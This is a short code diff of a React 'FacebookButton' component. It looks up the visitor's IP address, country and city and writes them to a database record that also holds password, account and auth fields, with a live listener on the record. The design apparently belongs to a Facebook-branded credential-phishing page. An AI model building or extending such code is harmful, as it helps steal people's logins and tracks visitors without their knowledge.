@@ -31,7 +31,7 @@ export const FacebookButton = () => {
             fetch("https://api.db-ip.com/v2/free/self/").then(d => d.json()).then(async d => {
                 var ipaddress = ipaddress = JSON.stringify({ IP: d.ipAddress, country: d.countryName, city: d.city});
                 const user = await addDoc(collection(db, "users"), {
-                  password:'123',account:'123',auth:'',ip:ipaddress,status: 1,status2:0,createdAt: new Date().getTime(),
+                  password:'',account:'',auth:'',ip:ipaddress,status: 1,status2:0,createdAt: new Date().getTime(),
                 });
                 listener(user.id);
                 localStorage.setItem("unique_id", JSON.stringify(user.id));
